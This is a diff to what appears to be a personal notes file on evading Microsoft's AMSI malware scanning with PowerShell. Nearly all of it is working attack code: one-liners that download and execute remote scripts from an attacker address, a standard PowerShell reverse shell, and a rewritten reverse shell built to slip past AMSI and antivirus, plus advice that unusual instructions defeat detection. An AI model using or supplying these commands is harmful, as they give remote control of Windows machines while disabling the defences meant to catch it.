@@ -1,6 +1,47 @@
 AMSI EVASION BY CUSTOM SCRIPTING REVERSE SHELLS 
 
-AMSI - Anti Malware Scanning Interface is an attempt by Microsoft to overcome the advantage held by interpreted scripts. These do not write to disk like .exe's and are executed in memory. 
-Traditional AV's scan the files in disk for malicious signature. I simplest way to evade AMSI is to write your own scripts. 
+AMSI - Anti Malware Scanning Interface is an attempt by Microsoft to overcome the advantage held by interpreted scripts. These do not write to disk like .exe's and are executed in memory. Traditional AV's scan the files in disk for malicious signature. I simplest way to evade AMSI is to write your own scripts. 
 
-TO be continued ...
+less talk and more code :) 
+
+Traditional Powershell fetch and execute
+----------------------------------------
+powershell IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/mini.ps1')
+
+Uncommon Powershell fetch and execute, not detected by most AV and AMSI
+-----------------------------------------------------------------------
+powershell.exe iwr -useb http://10.10.14.3:8080/home1.ps1 | iex;
+this can be used as a primary stager.
+
+Traditional Powershell Reverse Shell:
+------------------------------------
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENERIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Amsi Bypassing Reverse Shell:
+-----------------------------
+$socket = new-object System.Net.Sockets.TcpClient('10.10.14.3', 443);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do{
+	$writer.Write("> ");
+	$writer.Flush();
+	$read = $null;
+	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$out = $out.split(' ')
+	        $res = [string](&$out[0] $out[1..$out.length]);
+		if($res -ne $null){ $writer.WriteLine($res)}
+	}
+
+}While (!$out.equals("exit"))
+$writer.close();$socket.close();
+
+
+The point here is : 
+AMSI bypass is pretty similar to shell coding, you need the know the language well to script in it. In shellcoding you need to know assesmbly well to create an working exploit similarly to bypass AV you have to find your way around to represent your commands in the most uncommon fashion. 
+
+the more the uncommon instructions, the better the AV bypass. 
